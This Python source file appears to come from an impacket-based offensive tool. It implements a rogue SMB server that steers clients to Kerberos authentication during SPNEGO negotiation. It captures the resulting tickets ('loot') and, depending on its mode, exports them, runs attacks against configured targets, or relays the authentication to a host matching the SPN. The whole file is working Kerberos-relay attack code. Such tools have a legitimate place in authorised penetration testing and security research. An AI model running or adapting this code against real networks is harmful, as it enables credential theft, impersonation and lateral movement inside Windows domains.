from __future__ import division

import calendar
import logging
import random
import string
import struct
import time
import unicodedata
from threading import Thread

try:
    import configparser as ConfigParser
except ImportError:
    import ConfigParser

from pyasn1.codec.der import encoder
from six import b

from impacket import LOG, smb3
from impacket.nt_errors import STATUS_MORE_PROCESSING_REQUIRED, STATUS_SUCCESS
from impacket.smbserver import SMBSERVER, getFileTime
from impacket.spnego import ASN1_AID

from lib.protocols.kerberos.krb_relay.utils.kerberos import get_auth_data, get_kerberos_loot
from lib.protocols.kerberos.krb_relay.utils.spnego import (
    GSSAPIHeader_SPNEGO_Init,
    GSSAPIHeader_SPNEGO_Init2,
    MechType,
    NegotiationToken,
    TypesMech,
)


class SMBRelayServer(Thread):
    def __init__(self, config):
        Thread.__init__(self)
        self.daemon = True
        self.config = config
        self.targetprocessor = self.config.target
        self.authUser = None

        smb_config = ConfigParser.ConfigParser()
        smb_config.add_section("global")
        smb_config.set("global", "server_name", "server_name")
        smb_config.set("global", "server_os", "UNIX")
        smb_config.set("global", "server_domain", "WORKGROUP")
        smb_config.set("global", "log_file", "None")
        smb_config.set("global", "credentials_file", "")
        if self.config.smb2support is True:
            smb_config.set("global", "SMB2Support", "True")
        else:
            smb_config.set("global", "SMB2Support", "False")
        if self.config.outputFile is not None:
            smb_config.set("global", "jtr_dump_path", self.config.outputFile)

        smb_config.add_section("IPC$")
        smb_config.set("IPC$", "comment", "")
        smb_config.set("IPC$", "read only", "yes")
        smb_config.set("IPC$", "share type", "3")
        smb_config.set("IPC$", "path", "")

        self.server = SMBSERVER((config.interfaceIp, 445), config_parser=smb_config)
        logging.getLogger("impacket.smbserver").setLevel(logging.CRITICAL)
        self.server.processConfigFile()
        self.server.hookSmb2Command(smb3.SMB2_NEGOTIATE, self._smb_negotiate)
        self.server.hookSmb2Command(smb3.SMB2_SESSION_SETUP, self._smb_session_setup)
        self.server.addConnection("SMBRelay", config.interfaceIp, 445)

    def _smb_negotiate(self, conn_id, smb_server, recv_packet, is_smb1=False):
        conn_data = smb_server.getConnectionData(conn_id, checkStatus=False)
        LOG.info("SMBD: Received connection from %s", conn_data["ClientIP"])

        resp_packet = smb3.SMB2Packet()
        resp_packet["Flags"] = smb3.SMB2_FLAGS_SERVER_TO_REDIR
        resp_packet["Status"] = STATUS_SUCCESS
        resp_packet["CreditRequestResponse"] = 1
        resp_packet["Command"] = smb3.SMB2_NEGOTIATE
        resp_packet["SessionID"] = 0
        resp_packet["MessageID"] = recv_packet["MessageID"] if is_smb1 is False else 0
        resp_packet["TreeID"] = 0

        resp_command = smb3.SMB2Negotiate_Response()
        resp_command["SecurityMode"] = smb3.SMB2_NEGOTIATE_SIGNING_ENABLED
        resp_command["DialectRevision"] = smb3.SMB2_DIALECT_002
        resp_command["ServerGuid"] = b("".join(random.choice(string.ascii_letters) for _ in range(16)))
        resp_command["Capabilities"] = 0
        resp_command["MaxTransactSize"] = 65536
        resp_command["MaxReadSize"] = 65536
        resp_command["MaxWriteSize"] = 65536
        resp_command["SystemTime"] = getFileTime(calendar.timegm(time.gmtime()))
        resp_command["ServerStartTime"] = getFileTime(calendar.timegm(time.gmtime()))
        resp_command["SecurityBufferOffset"] = 0x80

        blob = GSSAPIHeader_SPNEGO_Init2()
        blob["tokenOid"] = "1.3.6.1.5.5.2"
        blob["innerContextToken"]["mechTypes"].extend(
            [
                MechType(TypesMech["KRB5 - Kerberos 5"]),
                MechType(TypesMech["MS KRB5 - Microsoft Kerberos 5"]),
                MechType(TypesMech["NTLMSSP - Microsoft NTLM Security Support Provider"]),
            ]
        )
        blob["innerContextToken"]["negHints"]["hintName"] = "not_defined_in_RFC4178@please_ignore"
        resp_command["Buffer"] = encoder.encode(blob)
        resp_command["SecurityBufferLength"] = len(resp_command["Buffer"])
        resp_packet["Data"] = resp_command
        smb_server.setConnectionData(conn_id, conn_data)
        return None, [resp_packet], STATUS_SUCCESS

    def _smb_session_setup(self, conn_id, smb_server, recv_packet):
        from pyasn1.codec.der import decoder

        conn_data = smb_server.getConnectionData(conn_id, checkStatus=False)
        session_setup = smb3.SMB2SessionSetup(recv_packet["Data"])
        security_blob = session_setup["Buffer"]

        if struct.unpack("B", security_blob[0:1])[0] != ASN1_AID:
            raise Exception("Expected ASN1 SPNEGO token")

        blob = decoder.decode(security_blob, asn1Spec=GSSAPIHeader_SPNEGO_Init())[0]
        token = blob["innerContextToken"]["negTokenInit"]["mechToken"]
        mech_types = blob["innerContextToken"]["negTokenInit"]["mechTypes"]
        if len(mech_types) > 0:
            mech_type = mech_types[0]
            if str(mech_type) not in (TypesMech["KRB5 - Kerberos 5"], TypesMech["MS KRB5 - Microsoft Kerberos 5"]):
                resp = smb3.SMB2SessionSetup_Response()
                resp_token = NegotiationToken()
                resp_token["negTokenResp"]["negResult"] = "request_mic"
                resp_token["negTokenResp"]["supportedMech"] = TypesMech["KRB5 - Kerberos 5"]
                resp_token_data = encoder.encode(resp_token)
                resp["SecurityBufferOffset"] = 0x48
                resp["SecurityBufferLength"] = len(resp_token_data)
                resp["Buffer"] = resp_token_data
                return [resp], None, STATUS_MORE_PROCESSING_REQUIRED

        if self.config.mode == "EXPORT":
            get_kerberos_loot(security_blob, self.config)
        elif self.config.mode == "ATTACK":
            authdata = get_kerberos_loot(security_blob, self.config)
            if authdata:
                self._do_attack(authdata)
        elif self.config.mode == "RELAY":
            authdata = get_auth_data(security_blob, self.config)
            self._do_relay(authdata)

        resp = smb3.SMB2SessionSetup_Response()
        resp_token = NegotiationToken()
        resp_token["negTokenResp"]["negResult"] = "accept_completed"
        resp["SecurityBufferOffset"] = 0x48
        resp["SecurityBufferLength"] = len(encoder.encode(resp_token))
        resp["Buffer"] = encoder.encode(resp_token)
        smb_server.setConnectionData(conn_id, conn_data)
        return [resp], None, STATUS_SUCCESS

    def _do_attack(self, authdata):
        self.authUser = "%s/%s" % (authdata["domain"], authdata["username"])
        for target in self.config.target.originalTargets:
            parsed_target = target
            if parsed_target.scheme.upper() not in self.config.attacks:
                continue
            client = self.config.protocolClients[parsed_target.scheme.upper()](self.config, parsed_target)
            client.initConnection(authdata, self.config.dcip)
            attack = self.config.attacks[parsed_target.scheme.upper()]
            client_thread = attack(self.config, client.session, self.authUser)
            client_thread.start()

    def _do_relay(self, authdata):
        self.authUser = "%s/%s" % (authdata["domain"], authdata["username"])
        _, host = authdata["service"].split("/", 1)
        try:
            host = host.encode("latin-1").decode("utf-8")
        except (UnicodeDecodeError, UnicodeEncodeError):
            pass
        host_normalized = unicodedata.normalize("NFKD", host).encode("ascii", "ignore").decode("ascii").lower()

        for target in self.config.target.originalTargets:
            parsed_target = target
            target_host = parsed_target.hostname.lower()
            if host_normalized not in target_host and target_host not in host_normalized:
                continue
            client = self.config.protocolClients[parsed_target.scheme.upper()](self.config, parsed_target)
            if not client.initConnection(authdata, self.config.dcip):
                return
            attack = self.config.attacks[parsed_target.scheme.upper()]
            client_thread = attack(self.config, client.session, self.authUser)
            client_thread.start()
            return
        LOG.error("No relay target matches SPN hostname: %s", host_normalized)

    def _start(self):
        self.server.daemon_threads = True
        self.server.serve_forever()
        LOG.info("Shutting down SMB Server")
        self.server.server_close()

    def run(self):
        LOG.info("Setting up SMB Server")
        self._start()
